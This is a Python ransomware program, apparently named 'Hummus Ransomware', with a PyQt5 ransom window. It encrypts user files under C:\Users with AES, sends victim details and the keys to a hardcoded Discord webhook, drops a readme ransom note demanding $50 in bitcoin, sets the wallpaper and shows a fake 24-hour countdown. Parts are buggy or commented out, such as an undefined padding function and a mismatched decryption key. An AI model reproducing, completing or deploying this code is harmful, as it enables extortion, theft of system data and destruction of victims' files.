import PyQt5
import PyQt5.QtWidgets
import PyQt5.QtCore
import sys
import requests
import random
import string
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import os
import shutil
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget, QProgressBar
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import Qt, QTimer, QObject, pyqtSignal, QThread
import ctypes
import platform
from datetime import datetime
import pytz
import psutil
import socket
from datetime import datetime, timedelta

# Initialize global variables
SPI_SETDESKWALLPAPER = 0x0014
btcAdd = ""
email = ""
discordWebhook = "https://discord.com/api/webhooks/1213226208494624768/LaW1E7j2183RtaOqqfttCaQGvnOhEvi13Uu80L_UHgAmFeNXhDbAU3X-BMIWht5IP3Rk"
os_info = f"Operating System: {platform.system()} {platform.version()}"
current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
timezone_info = f"Timezone: {current_timezone}"
architecture_info = f"System Architecture: {platform.architecture()}"
processor_info = f"Processor: {platform.processor()}"
memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
fileTypes = ['.txt']
'''
otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
             '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic',
             '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup',
             '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis',
             '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf',
             '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff',
             '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx',
             '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav',
             '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak', '.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py',
             '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer',
             '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref',
             '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpeg',
             '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', '.dbfv', '.mdf', '.wb2', '.rtf', '.wpd',
             '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx',
             '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', '.odt', '.sql', '.zip', '.tar',
             '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid', '.mkv', '.mov', '.asf',
             '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC',
             '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd', '.class',
             '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd', '.MYI', '.MYD',
             '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11(Securitycopy)', '.sldm', '.sldx', '.ppsm',
             '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc',
             '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr',
             '.key', 'wallet.dat']
'''

def set_wallpaper(image_filename):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(script_dir, image_filename)

    # Check if the file exists
    if not os.path.isfile(image_path):
        print(f"Error: The specified image file '{image_path}' does not exist.")
        return

    # Set the wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
    print(f"Wallpaper set to '{image_path}'.")

#Define RW Class for functionality
class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherits from pyqt, runnable object 4 multithreading
    def __init__(self):                             # Constructor, inits Ransomware object in pyqt multithread envriroment
        super(Ransomware, self).__init__()          # calls the constructor of qrunnable for intialization
        self.threadpool = PyQt5.QtCore.QThreadPool()# creates an instance of Qthreadpool( manages pools of threads)
        self.randomId = self.rID(12)                # generates a randID 12 length using rID method
        self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
        self.decryptionPass = self.rSeed(32)
        self.filePath = "C:\\Users\\"               # sets file path attribute 
        self.ip = ""                                # inits ip attribute to empty string 4 later
        self.userName = ""                          # inits userName attribute to empty string 4 later
        key = self.encryptionPass.encode()          # encodes encryption pass into bytes to be used as key for encryption
        self.crypto = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor() # creates instance of AES enc algo, operates in ECB mode using default backend

    # Write ransomware note on victims desktop
    def readMe(self):                               # defines method within class
        try:                                        # start of try block
            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f: # opens file in r+w mode, if doesnt exit, will create it
                f.write(ransomNote)                       # writes the content of the note
        except Exception as e:                      # error catch
            print(f"Error writing readme.txt: {e}")
            
    # Retrieve details about victim's system
    def getUserDetails(self):                       # Declares method 
        try:                                        # try block
            self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"] # sends get request to endpoint, which gets the public IP, parsed as JSON, extracted and assigned to self.ip
            self.userName = os.getlogin()           # uses the function to retrieve login name of user and assign it to attribute 
        except Exception as e:                      # error catch
            print(f"Error getting user details: {e}")

    #Encrypt file using AES Encryption
    def encryptFile(self, file):
        try:
            with open(file, 'rb') as infile:
                plaintext = pad(infile.read(), 16)  # Block size is 16 bytes for AES
                ciphertext = self.crypto.update(plaintext) + self.crypto.finalize()
                with open(file, "wb") as outfile:
                    outfile.write(ciphertext)
        except Exception as e:
            print(f"Error encrypting {file}: {e}")

    def decryptFile(self, file, decryption_key):
        try:
            with open(file, 'rb') as infile:
                ciphertext = infile.read()
                key = decryption_key.encode()  # Convert decryption key to bytes
                cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
                plaintext = cipher.update(ciphertext) + cipher.finalize()
                unpadder = padding.PKCS7(128).unpadder()
                decrypted_data = unpadder.update(plaintext) + unpadder.finalize()
                with open(file, "wb") as outfile:
                    outfile.write(decrypted_data)
        except Exception as e:
            print(f"Error decrypting {file}: {e}")

    # Main method for ransomware functionality

    '''def run(self):
        self.sendMessage()
        for root, directories, files in os.walk(self.filePath):
            for filename in files:
                filepath = os.path.join(root, filename)
                for base in fileTypes:
                    if base in filepath:
                        threading.Thread(target=self.encryptFile, args=(filepath,)).start()

        self.readMe()'''


    


    # Send message to Discord Webhook with victim details 

    def sendMessage(self):
        try:
            self.getUserDetails()
        except Exception as e:
            print(f"Error getting user details for sending message: {e}")

        os_info = f"Operating System: {platform.system()} {platform.version()}"
        current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
        timezone_info = f"Timezone: {current_timezone}"
        architecture_info = f"System Architecture: {platform.architecture()}"
        processor_info = f"Processor: {platform.processor()}"
        memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        data = {
            "embeds": [
                {
                    "title": "**__Victim Report__:**",
                    "description": (
                        f"```css\nUSERID: {self.randomId}``` "
                        f"```css\nENCRYPTION KEY: {self.encryptionPass}``` "
                        f"```css\nDECRYPTION KEY: {self.decryptionPass}``` "
                        f"```css\nUSERNAME: {self.userName}``` "
                        f"```css\nIP: {self.ip}``` "
                        f"```css\n{os_info}``` "
                        f"```css\nHostname: {hostname}``` "
                        f"```css\nLocal IP: {ip_address}``` "
                        f"```css\n{timezone_info}``` "
                        f"```css\n{architecture_info}``` "
                        f"```css\n{processor_info}``` "
                        f"```css\n{memory_info}```"
                    ),
                    "color": 13959168,
                    "thumbnail": {
                        "url": "https://www.pngkit.com/png/full/168-1680567_69137579-pentagram-with-demon-baphomet-satanic-goat.png"
                    },
                    "author": {
                        "name": "Scrypt",
                        "icon_url": "https://i.imgur.com/F3j7z5K.png"
                    }
                }
            ]
        }

        try:
            r = requests.post(discordWebhook, json=data)
        except Exception as e:
            print(f"Error sending message to Discord webhook: {e}")


    # Generate random string for encryption password
    def rSeed(self, stringLength):
        password_characters = string.ascii_letters
        return ''.join(random.choice(password_characters) for i in range(stringLength))

    # Generate random string for unique ID
    def rID(self, stringLength):
        password_characters = string.ascii_letters + string.digits
        return ''.join(random.choice(password_characters) for i in range(stringLength))

# Define class for main GUI of ransomware
class Worker(QObject):
    progress_updated_1 = pyqtSignal(int)
    progress_updated_2 = pyqtSignal(int)
    progress_updated_3 = pyqtSignal(int)

    def crawl(self):
        # Simulate encryption progress for the first progress bar
        for i in range(101):
            self.progress_updated_1.emit(i)
            QThread.msleep(100)  # Simulate work (sleep for 100 milliseconds)

        # Simulate progress for the second progress bar
        for j in range(101):
            self.progress_updated_2.emit(j)
            QThread.msleep(100)

        # Simulate progress for the third progress bar
        for k in range(101):
            self.progress_updated_3.emit(k)
            QThread.msleep(100)

class RansomwareGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        # Initialize global variables
        self.btcAdd = ""
        self.email = ""

        # Define ransom note
        self.ransomNote = f"""
        All Your Files Have Been Encrypted\n
        At the end of the day weve decided you need to\n
        pay the piper.
        Here are the instructions to get your files back\n
        1. Pay $50 btc to the listed address\n
        2. Send an email and include your unique id\n
        3. Wait for your decryption key!\n
        ------------------------------------\n
        Check your desktop for readme.txt if you are lost!\n
        ------------------------------------\n
        BTC Address: {self.btcAdd}\n
        Email: {self.email}\n
        ------------------------------------\n
        """

        # Set up the GUI
        self.initUI()

        # Start encryption progress and decryption countdown
        self.startEncryptionProgress()
        self.startDecryptionCountdown()

        ransomware_instance = Ransomware()
        ransomware_instance.sendMessage()
        ransomware_instance.readMe()

            # Add decryption button
        decrypt_button = QPushButton('Decrypt', self)
        decrypt_button.setStyleSheet("""
            QPushButton{
                background-color: #d50000;
                border-radius: 7.5px;
                font-weight: 1200;
                font-size: 18px;
                color: #000;  /* Black font color */
            }
            QPushButton:hover {
                background-color: #9b0000;
            }
        """)
        self.layout.addWidget(decrypt_button)
        decrypt_button.clicked.connect(self.decryptFiles)
        
        # Add decryption progress bars
        self.decryption_progress_bars = [QProgressBar(self) for _ in range(3)]
        for progress_bar in self.decryption_progress_bars:
            self.layout.addWidget(progress_bar)
            self.setStyleSheet("""
                QProgressBar{
                    color: #fff;                                
                }
            """)

    def decryptFiles(self):
        decryption_key = self.decryptionPass  # Use the decryption key generated during encryption
        if decryption_key:
            ransomware_instance = Ransomware()
            for root, directories, files in os.walk(ransomware_instance.filePath):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    for base in fileTypes:
                        if base in filepath:
                            threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
                for directory in directories:  # Iterating over subdirectories
                    for filename in os.listdir(os.path.join(root, directory)):
                        filepath = os.path.join(root, directory, filename)
                        for base in fileTypes:
                            if base in filepath:
                                threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()



        
    def initUI(self):
        # Create central widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        # Create layout
        self.layout = QVBoxLayout(central_widget)

        # Set the background color of the central widget to black
        central_widget.setStyleSheet("background-color: #000000;")

        # Add Hummus Ransomware banner box
        banner_label = QLabel("Hummus Ransomware", self)
        banner_label.setAlignment(Qt.AlignCenter)
        banner_label.setStyleSheet("""
            QLabel{
                background-color: #d50000;
                color: #000;  /* Black font color */
                border: 2px solid #ff5131;
                border-radius: 7.5px;
                font-family: 'Segoe UI', sans-serif;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                margin-bottom: 20px;
            }
        """)
        self.layout.addWidget(banner_label)

        # Add stylish ransom note label with a red block background
        self.ransom_note_label = QLabel(self.ransomNote)
        self.ransom_note_label.setAlignment(Qt.AlignCenter)
        self.ransom_note_label.setStyleSheet("""
            QLabel{
                color: #000;  /* Black font color */
                font-family: 'Segoe UI', sans-serif;
                font-size: 14px;
                font-weight: bold;  /* Bold font */
                background-color: #d50000;  /* Red block background */
                padding: 20px;
                border-radius: 7.5px;
                margin: 20px 0;
            }
        """)
        self.layout.addWidget(self.ransom_note_label)

        # Add encryption progress bars
        self.progress_bars = [QProgressBar(self) for _ in range(3)]
        for progress_bar in self.progress_bars:
            self.layout.addWidget(progress_bar)
            self.setStyleSheet("""
                QProgressBar{
                    color: #fff;                                
                }
            """)

        # Add continue button with hover effect
        continue_button = QPushButton('Continue', self)
        continue_button.setStyleSheet("""
            QPushButton{
                background-color: #d50000;
                border-radius: 7.5px;
                font-weight: 1200;
                font-size: 18px;
                color: #000;  /* Black font color */
            }
            QPushButton:hover {
                background-color: #9b0000;
            }
        """)
        self.layout.addWidget(continue_button)
        continue_button.clicked.connect(self.hide)

        # Set up window properties
        self.setGeometry(100, 100, 800, 600)
        self.setWindowTitle('Ransomware GUI')
        # Replace with your icon path
        self.setWindowIcon(QIcon('path/to/icon.png'))

        self.show()

    def startEncryptionProgress(self):
        # Create a worker thread
        self.worker_thread = QThread()

        # Move the worker object to the thread
        self.worker = Worker()
        self.worker.moveToThread(self.worker_thread)

        # Connect signals between the worker and GUI
        self.worker.progress_updated_1.connect(self.updateEncryptionProgress1)
        self.worker.progress_updated_2.connect(self.updateEncryptionProgress2)
        self.worker.progress_updated_3.connect(self.updateEncryptionProgress3)

        # Start the thread
        self.worker_thread.started.connect(self.worker.crawl)
        self.worker_thread.start()

    def updateEncryptionProgress1(self, value):
        # Update the first progress bar
        self.progress_bars[0].setValue(value)

    def updateEncryptionProgress2(self, value):
        # Update the second progress bar
        self.progress_bars[1].setValue(value)

    def updateEncryptionProgress3(self, value):
        # Update the third progress bar
        self.progress_bars[2].setValue(value)

    def startDecryptionCountdown(self):
        self.decryption_timer = QTimer(self)
        self.decryption_timer.timeout.connect(self.updateDecryptionCountdown)
        self.decryption_timer.start(1000)  # Update countdown every second
        self.decryption_time_remaining = 86400  # 24 hours in seconds

    def updateDecryptionCountdown(self):
        # Implement your logic to update the decryption countdown
        # For example, decrease the remaining time and update the label
        self.decryption_time_remaining -= 1
        hours, remainder = divmod(self.decryption_time_remaining, 3600)
        minutes, seconds = divmod(remainder, 60)
        countdown_str = f"Decryption Countdown: {hours:02}:{minutes:02}:{seconds:02}"
        self.ransom_note_label.setText(self.ransomNote + "\n" + countdown_str)

    def closeEvent(self, event):
        # Clean up and stop the worker thread when the GUI is closed
        self.worker_thread.quit()
        self.worker_thread.wait()
        event.accept()


# Define ransom note and detailed ransom note 
detailedNote = f"""
-------------------------------------------------------------------------------------------------------------------------
Hello,\n
    If you are reading this then you have likely been hit by my Ransomware\n
    We apologize for any inconvenience caused; our primary goal is to facilitate a resolution through payment.\n
    In order to receive the decrypter you must follow the following steps to truely recover\n
    all your files.\n
    1. Download BitPay: https://bitpay.com/wallet/ if you are using a different wallet thats fine.\n
    2. Send $50 to this address: {btcAdd}\n
    3. After sending it wait for a confirmation and send us an email with your UniqueID: {Ransomware().randomId}\n
    4. Wait shortly, you will receive an email with your decrypter once everything is handled.\n
    5. If we do not receive payment within 2 weeks we will no longer be handeling support.
-------------------------------------------------------------------------------------------------------------------------

"""
ransomNote = f"""
All Your Files Have Been Encrypted\n
At the end of the day we just want to get paid\n
Here are the instructions to get getting your files back\n
1. Pay $50 btc to the listed address\n
2. Send an email and include your unique id\n
3. Wait\n
------------------------------------\n
Check your desktop for readme.txt if you are lost!\n
------------------------------------\n
BTC Address: {btcAdd}\n
Email: {email}\n
UniqueID: {Ransomware().randomId}\n
------------------------------------\n
Click the Button Below To Continue:
(Killing this program will result in a full loss of files)\n
"""
# Entry point to the program
if __name__ == '__main__':
    # Specify the filename of the image within the directory
    image_filename = "Hummusss.jpg"

    # Call the function to set the wallpaper
    set_wallpaper(image_filename)
    app = QApplication(sys.argv)
    gui = RansomwareGUI()
    sys.exit(app.exec_())
